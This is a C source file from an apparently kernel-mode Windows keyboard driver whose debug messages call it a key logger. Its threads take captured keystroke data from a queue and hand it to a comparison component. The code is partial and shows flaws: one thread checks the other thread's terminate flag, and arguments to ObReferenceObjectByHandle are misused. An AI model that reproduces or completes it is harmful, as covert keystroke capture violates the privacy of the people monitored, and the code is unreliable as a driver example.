/*
 * Module: obthread.c
 * Author: Christopher Wood
 * Description: Worker threads for use by driver
 * Environment: Kernel mode only
 */

#include "driver.h"
#include "thread.h"
#include "hook.h"
#include "compare.h"
#include "ntddkbd.h"

/* InitThreads */
NTSTATUS
InitThreads(
	IN PDRIVER_OBJECT pDriverObject,
	IN KEY_QUEUE *writeQueue
	)
{
	// Local variables
	PDEVICE_EXTENSION pKeyboardDeviceExtension;
	HANDLE hWorkerThread;
	HANDLE hExtractThread;
	NTSTATUS status;

	// Retrieve device extension
	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	// Set the thread terminate states to false
	pKeyboardDeviceExtension->bExtractTerminate = false;
	pKeyboardDeviceExtension->bWorkerTerminate = false;

	// Create the threads
	status	= PsCreateSystemThread(&hWorkerThread,
								(ACCESS_MASK)0,
								NULL,
								(HANDLE)0,
								NULL,
								WorkerThread,
								pKeyboardDeviceExtension
								);

	if(!NT_SUCCESS(status))
		return status;

	status	= PsCreateSystemThread(&hExtractThread,
								(ACCESS_MASK)0,
								NULL,
								(HANDLE)0,
								NULL,
								ExtractThread,
								pKeyboardDeviceExtension
								);

	if(!NT_SUCCESS(status))
		return status;
	DbgPrint("Threads created successfully.\n");

	// Obtain pointers to the thread objects
	ObReferenceObjectByHandle(hWorkerThread,
							THREAD_ALL_ACCESS,
							NULL,
							KernelMode,
							(PVOID*)&pKeyboardDeviceExtension->pWorkerThread,
							writeQueue // was NULL
							);

	DbgPrint("Key logger thread initialized; hWorkerThread =  %x\n",
			&pKeyboardDeviceExtension->pWorkerThread);

	ObReferenceObjectByHandle(hExtractThread,
							THREAD_ALL_ACCESS,
							NULL,
							KernelMode,
							(PVOID*)&pKeyboardDeviceExtension->pExtractThread,
							pKeyboardDeviceExtension // was NULL
							);

	DbgPrint("Key logger thread initialized; hExtractThread =  %x\n",
		&pKeyboardDeviceExtension->pExtractThread);

	// Close thread handles
	ZwClose(hWorkerThread);
	ZwClose(hExtractThread);

	return status;
} // end InitThreads

/* ExtractThread */
VOID
ExtractThread(
	IN PVOID pContext
	)
{
	// Local variables
	PDEVICE_EXTENSION pKeyboardDeviceExtension;
	PDEVICE_OBJECT pKeyboardDeviceObject;
	PLIST_ENTRY pEntry;
	KEY_DATA *pKeyData;

	// Retrieve pointer to device extension and device object
	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
	pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;

	// Enter main thread loop
	while(true)
	{
		// Wait for KEY_DATA struct to become available in queue
		KeWaitForSingleObject(&((pKeyboardDeviceExtension->bufferQueue).semQueue),
							Executive,
							KernelMode,
							FALSE,
							NULL
							);

		// Pop off the first entry and save it for the time being
		pEntry = ExInterlockedRemoveHeadList(&((pKeyboardDeviceExtension->bufferQueue).QueueListHead),
												&((pKeyboardDeviceExtension->bufferQueue).lockQueue));

		// Check to see if the thread isn't set to terminate
		if(pKeyboardDeviceExtension->bExtractTerminate == true)
			PsTerminateSystemThread(STATUS_SUCCESS);

		// Retrieve the KEY_DATA struct associated with the list entry
		pKeyData = CONTAINING_RECORD(pEntry, KEY_DATA, ListEntry);

		// TODO: need to ensure that data was properly set?

		// Send data off to comparison component
		enqueueData(pKeyData->Data, 'b');

	}
    return;

} // end ExtractThread

/* WorkerThread */
//TODO: modify this function as needed for worker (pContext is not the same as above!)
VOID WorkerThread(
	IN PVOID pContext
	)
{
	// implement..
	// Local variables
	PDEVICE_EXTENSION pKeyboardDeviceExtension;
	PDEVICE_OBJECT pKeyboardDeviceObject;
	PLIST_ENTRY pEntry;
	KEY_DATA *pKeyData;

	// Retrieve pointer to device extension and device object
	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
	pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;

	// Enter main thread loop
	while(true)
	{
		// Wait for KEY_DATA struct to become available in queue
		KeWaitForSingleObject(&((pKeyboardDeviceExtension->bufferQueue).semQueue),
							Executive,
							KernelMode,
							FALSE,
							NULL
							);

		// Pop off the first entry and save it for the time being
		pEntry = ExInterlockedRemoveHeadList(&((pKeyboardDeviceExtension->bufferQueue).QueueListHead),
												&((pKeyboardDeviceExtension->bufferQueue).lockQueue));

		// Check to see if the thread isn't set to terminate
		if(pKeyboardDeviceExtension->bExtractTerminate == true)
			PsTerminateSystemThread(STATUS_SUCCESS);

		// Retrieve the KEY_DATA struct associated with the list entry
		pKeyData = CONTAINING_RECORD(pEntry, KEY_DATA, ListEntry);

		// TODO: need to ensure that data was properly set?

		// Send data off to comparison component
		enqueueData(pKeyData->Data, 'w');

	}
    return;

} // end WorkerThread
